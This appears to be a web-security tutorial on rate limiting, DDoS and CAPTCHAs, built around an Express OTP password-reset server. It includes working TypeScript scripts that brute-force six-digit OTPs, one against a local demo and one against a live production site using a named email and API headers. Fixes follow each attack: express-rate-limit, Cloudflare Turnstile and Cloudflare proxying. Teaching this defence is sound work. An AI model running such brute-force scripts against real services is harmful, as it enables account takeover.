# DDoS and Rate Limiting

## Rate Limiting

Rate limiting is a crucial technique employed in web applications and APIs to control the rate at which requests are processed. It serves several important purposes:

![Rate Limiting Overview](https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd624914-6876-4b58-9694-424f7aa5e22a%2F7ebce82c-965e-46fb-8cf4-2255b003429d%2FUntitled.png?table=block&id=7244e6ca-3b26-4437-95eb-0a742026e9b5&cache=v2)

### 1. Preventing Overload

Rate limiting controls how often a user or system can make requests to a service. This helps prevent overuse of resources, ensuring that the system remains available and responsive for all users.  
**Example**: Stop a single user from making thousands of login attempts per minute, which could degrade service for others.

### 2. Mitigating Abuse

Without rate limiting, applications are more susceptible to abuse such as:
- Brute force attacks on passwords  
- Spamming behavior  

Limiting request frequency reduces the feasibility of such attacks and maintains system integrity.

### 3. Managing Traffic

In high-traffic scenarios (e.g., ticket sales for a popular event), rate limiting:
- Helps manage server load  
- Prevents crashes  
- Ensures fair access to resources like bandwidth or purchasing systems  

It regulates incoming request flow and prevents any single user from monopolizing resources.

### 4. DDoS Protection

A **Distributed Denial of Service (DDoS)** attack floods a site with traffic from multiple sources, making it unavailable.  
Rate limiting is often used as part of a **comprehensive DDoS protection strategy** by:
- Limiting requests per IP address or source  
- Filtering out abnormal traffic patterns  

> Note: Rate limiting alone is **not sufficient** for full DDoS protection (see later sections).

### 5. Cost Optimization

In cloud environments (where resources = billed usage), rate limiting:
- Prevents excessive resource consumption  
- Avoids unnecessary auto-scaling  
- Reduces operational costs  

> **Summary**: Rate limiting ensures **availability**, **security**, and **scalability** by balancing legitimate traffic against abuse or overload.

---

## Applying Rate Limiting

![Where to Apply Rate Limiting](https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd624914-6876-4b58-9694-424f7aa5e22a%2F21edd960-9305-42da-af89-b34601ca0649%2FUntitled.png?table=block&id=30903f28-3094-4a1c-a8fc-fd49d41c63ed&cache=v2)

### 1. Password Reset Endpoints

- OTP-based password reset endpoints **must be heavily rate-limited**.  
- Without it, attackers can brute-force OTPs by sending thousands of guesses.  
- This could lead to **unauthorized account access**.

### 2. Login Endpoints

- Prevent brute-force credential attacks.  
- Limit failed attempts per:
  - IP address  
  - User ID  
  - Email  

### 3. Sign-up/Registration Endpoints

- Prevent automated fake account creation.  
- Stop abuse like spam, credential stuffing, or scraping.

### 4. API Endpoints

- Public APIs should enforce rate limits to:
  - Prevent monopolization by a single client  
  - Maintain availability for all users  
  - Reduce DDoS risk  

### 5. Sensitive Operations

- Endpoints that change:
  - Email addresses  
  - Passwords  
  - 2FA settings  
- Should be rate-limited to block repeated abuse attempts.

### 6. High-Traffic Endpoints

- E.g., flash sales, NFT mints, ticketing.  
- Rate limiting ensures **fair queuing** and **system stability**.

### General Considerations

- Apply rate limits based on:
  - IP address  
  - User ID  
  - Email  
  - Session token  
- Set **reasonable thresholds** that allow legitimate use while blocking abuse.

![Rate Limiting Strategy](https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd624914-6876-4b58-9694-424f7aa5e22a%2F2da907ff-5188-40a3-a751-ea5d9d0fd896%2FUntitled.png?table=block&id=edb53c28-6532-4135-a8ff-e74a7e33c55e&cache=v2)

---

## Implementing a Simple Reset Password Endpoint

We’ll build a basic Express.js server with:
- `/generate-otp`: logs a 6-digit OTP to console  
- `/reset-password`: validates OTP and resets password  

### Initializing a TypeScript Project

```bash
npm init -y
npx tsc --init
```

### Updating `tsconfig.json`

Set source and output directories:

```json
{
  "compilerOptions": {
    "rootDir": "./src",
    "outDir": "./dist"
  }
}
```

### Installing Dependencies

```bash
npm install express @types/express
```

### Adding the Code (`src/index.ts`)

```ts
import express from 'express';

const app = express();
const PORT = 3000;

app.use(express.json());

// In-memory OTP store
const otpStore: Record<string, string> = {};

// Generate OTP
app.post('/generate-otp', (req, res) => {
  const { email } = req.body;
  if (!email) {
    return res.status(400).json({ message: "Email is required" });
  }
  const otp = Math.floor(100000 + Math.random() * 900000).toString();
  otpStore[email] = otp;
  console.log(`OTP for ${email}: ${otp}`);
  res.status(200).json({ message: "OTP generated and logged" });
});

// Reset password
app.post('/reset-password', (req, res) => {
  const { email, otp, newPassword } = req.body;
  if (!email || !otp || !newPassword) {
    return res.status(400).json({ message: "Email, OTP, and new password are required" });
  }
  if (otpStore[email] === otp) {
    console.log(`Password for ${email} has been reset to: ${newPassword}`);
    delete otpStore[email];
    res.status(200).json({ message: "Password has been reset successfully" });
  } else {
    res.status(401).json({ message: "Invalid OTP" });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
```

### Testing with Postman

1. Start server:  
   ```bash
   npx ts-node src/index.ts
   ```
2. **Generate OTP**:
   ```json
   POST http://localhost:3000/generate-otp
   { "email": "example@example.com" }
   ```
3. **Reset Password**:
   ```json
   POST http://localhost:3000/reset-password
   {
     "email": "example@example.com",
     "otp": "123456",
     "newPassword": "newpassword"
   }
   ```

> **⚠️ Vulnerability**: No rate limiting → attacker can brute-force OTP with unlimited requests.

---

## Exploiting the Endpoint

### Creating an Exploit Script

#### 1. Create new project
```bash
mkdir exploit-service
cd exploit-service
npm init -y
npx tsc --init
```

#### 2. Install dependencies
```bash
npm install axios
```

#### 3. Add brute-force logic (`src/index.ts`)

```ts
import axios from "axios";

async function sendRequest(otp: number) {
  const data = JSON.stringify({
    email: "harkirat@gmail.com",
    otp: otp.toString().padStart(6, '0'),
    newPassword: "123123123"
  });

  const config = {
    method: 'post',
    url: 'http://localhost:3000/reset-password',
    headers: { 'Content-Type': 'application/json' },
    data
  };

  try {
    await axios.request(config);
    console.log("Success for OTP:", otp);
  } catch {
    // Ignore failed attempts
  }
}

async function main() {
  for (let i = 0; i < 1000000; i += 100) {
    console.log("Trying OTPs from", i, "to", i + 99);
    const promises = [];
    for (let j = 0; j < 100; j++) {
      promises.push(sendRequest(i + j));
    }
    await Promise.all(promises);
  }
}

main();
```

### Running the Exploit

1. Start the vulnerable server.
2. Run exploit script:
   ```bash
   npx ts-node src/index.ts
   ```
3. Observe: server accepts **all requests** → OTP can be brute-forced.

> **Fix**: Implement rate limiting on `/reset-password`.

---

## Exploiting One in Production

Target: [https://harkirat.classx.co.in](https://harkirat.classx.co.in)

### Steps

1. Go to the site → enter any email → request OTP.
2. Submit random OTP → observe: **no rate limiting**.
3. Copy the `/otpverify` request from **DevTools > Network** as cURL.
4. Import into Postman → export as Node.js code.

### Updated Exploit Script (for Production)

```ts
import axios from "axios";

async function sendRequest(otp: number) {
  const url = `https://harkiratapi.classx.co.in/get/otpverify?useremail=harkirat.iitr%40gmail.com&otp=${otp}`;
  const config = {
    method: 'get',
    url,
    headers: {
      'auth-key': 'appxapi',
      'client-service': 'Appx',
      'origin': 'https://harkirat.classx.co.in',
      'referer': 'https://harkirat.classx.co.in/',
      'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
    }
  };

  try {
    await axios.request(config);
  } catch (error) {
    console.error("Error:", error.message);
  }
}

async function main() {
  for (let i = 0; i < 1000000; i += 100) {
    console.log("Testing OTPs:", i, "-", i + 99);
    const promises = Array(100).fill(0).map((_, j) => sendRequest(i + j));
    await Promise.all(promises);
  }
}

main();
```

### Result: **Rate Limited!**

After a few hundred requests, the server returns:
- `429 Too Many Requests`  
- Or blocks further attempts  

✅ This shows **production has rate limiting**—unlike the local demo.

---

## Saving the Endpoint

Use `express-rate-limit` to secure sensitive routes.

### Install Dependency

```bash
npm install express-rate-limit
```

### Update Code

```ts
import express from 'express';
import rateLimit from 'express-rate-limit';

const app = express();
const PORT = 3000;

app.use(express.json());

// OTP generation limiter: 3 per 5 minutes
const otpLimiter = rateLimit({
  windowMs: 5 * 60 * 1000,
  max: 3,
  message: 'Too many OTP requests. Try again in 5 minutes.',
  standardHeaders: true,
  legacyHeaders: false,
});

// Password reset limiter: 5 per 15 minutes
const passwordResetLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: 'Too many password reset attempts. Try again in 15 minutes.',
  standardHeaders: true,
  legacyHeaders: false,
});

const otpStore: Record<string, string> = {};

// Protected endpoints
app.post('/generate-otp', otpLimiter, (req, res) => {
  const { email } = req.body;
  if (!email) return res.status(400).json({ message: "Email required" });
  const otp = Math.floor(100000 + Math.random() * 900000).toString();
  otpStore[email] = otp;
  console.log(`OTP for ${email}: ${otp}`);
  res.json({ message: "OTP generated" });
});

app.post('/reset-password', passwordResetLimiter, (req, res) => {
  const { email, otp, newPassword } = req.body;
  if (!email || !otp || !newPassword) {
    return res.status(400).json({ message: "Email, OTP, and password required" });
  }
  if (otpStore[email] === otp) {
    console.log(`Password reset for ${email}`);
    delete otpStore[email];
    res.json({ message: "Password reset successful" });
  } else {
    res.status(401).json({ message: "Invalid OTP" });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
```

✅ Now brute-force attacks are **blocked after a few attempts**.

---

## Issues With Rate Limiting

> **Rate limiting ≠ DDoS protection**

### Why Attackers Perform DDoS Attacks

1. **Extortion**: Demand ransom to stop attack.
2. **Competitive sabotage**: e.g., during sneaker drops or NFT mints.
3. **Ideological/political motives**: Disrupt organizations.

### How DDoS Attacks Work

- Flood target with traffic from **thousands of bots (botnet)**.
- Exhaust:
  - Bandwidth  
  - CPU/memory  
  - Connection pool  

Even with rate limiting, network saturation can crash the server.

![DDoS Attack Diagram](https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd624914-6876-4b58-9694-424f7aa5e22a%2Ffebb946a-0cd3-46b6-b785-d7cacea4b6cd%2FUntitled.png?table=block&id=f37e2caf-d68e-45c9-8cda-0185bc681394&cache=v2)

### Protecting Reset Password from DDoS

1. **Limit resets per email**: e.g., max 3/day.
2. **Add CAPTCHA** (e.g., Cloudflare Turnstile).
3. **Use DDoS mitigation services**: Cloudflare, AWS Shield, etc.
4. **Monitor & alert**: Detect traffic spikes early.

---

## CAPTCHAs

CAPTCHA = **Completely Automated Public Turing test to tell Computers and Humans Apart**.

### The Need for CAPTCHAs

- Rate limiting can be bypassed by:
  - IP rotation  
  - Distributed bots  
- CAPTCHA adds a **human verification layer**.

### Cloudflare Turnstile: A Free CAPTCHA Replacement

✅ **Benefits**:
- No annoying puzzles  
- Privacy-friendly  
- Invisible to users  
- Stops bots via browser fingerprinting & lightweight proofs  

---

## Adding CAPTCHAs via Cloudflare Turnstile

### 1. Set Up Turnstile

- Go to [https://www.cloudflare.com/products/turnstile/](https://www.cloudflare.com/products/turnstile/)
- Register your domain
- Note your:
  - **Site Key**
  - **Secret Key**

### 2. Create React Project

```bash
npm install @marsidev/react-turnstile axios
```

### 3. Update React Component (`App.tsx`)

```tsx
import { Turnstile } from '@marsidev/react-turnstile';
import axios from 'axios';
import { useState } from 'react';

function App() {
  const [token, setToken] = useState<string>("");

  return (
    <>
      <input placeholder="OTP" />
      <input placeholder="New password" />
      
      <Turnstile
        onSuccess={(t) => setToken(t)}
        siteKey="YOUR_SITE_KEY"
      />

      <button onClick={() => {
        axios.post("http://localhost:3000/reset-password", {
          email: "harkirat@gmail.com",
          otp: "123456",
          token
        });
      }}>
        Update Password
      </button>
    </>
  );
}

export default App;
```

### 4. Update Backend (`src/index.ts`)

```ts
import express from 'express';
import cors from 'cors';

const SECRET_KEY = "YOUR_SECRET_KEY";
const app = express();
const PORT = 3000;

app.use(express.json());
app.use(cors());

const otpStore: Record<string, string> = {};

app.post('/generate-otp', (req, res) => {
  const { email } = req.body;
  if (!email) return res.status(400).json({ message: "Email required" });
  const otp = Math.floor(100000 + Math.random() * 900000).toString();
  otpStore[email] = otp;
  console.log(`OTP for ${email}: ${otp}`);
  res.json({ message: "OTP generated" });
});

app.post('/reset-password', async (req, res) => {
  const { email, otp, newPassword, token } = req.body;

  // Verify Turnstile token
  const formData = new URLSearchParams();
  formData.append('secret', SECRET_KEY);
  formData.append('response', token);

  const verifyRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
    method: 'POST',
    body: formData
  });
  const { success } = await verifyRes.json();

  if (!success) {
    return res.status(403).json({ message: "Bot detected" });
  }

  if (!email || !otp || !newPassword) {
    return res.status(400).json({ message: "Missing fields" });
  }
  if (otpStore[email] === otp) {
    console.log(`Password reset for ${email}`);
    delete otpStore[email];
    res.json({ message: "Success" });
  } else {
    res.status(401).json({ message: "Invalid OTP" });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
```

✅ Now: **Only humans** can reset passwords.

---

## DDoS Protection in Production

### Move Your Domain to Cloudflare

1. Sign up at [cloudflare.com](https://www.cloudflare.com/)
2. Add your domain → follow DNS setup

### Proxy All Records via Cloudflare

- In **DNS settings**, ensure every record (A, CNAME, etc.) has the **orange cloud** (proxied).
- This routes all traffic through Cloudflare’s global network, which:
  - Absorbs DDoS attacks  
  - Filters malicious traffic  
  - Provides WAF, rate limiting, and caching  

✅ With Cloudflare, your origin server **never sees the attack traffic**.

--- 

> **Final Note**: Combine **rate limiting**, **CAPTCHA**, and **infrastructure-level DDoS protection** for a robust security posture.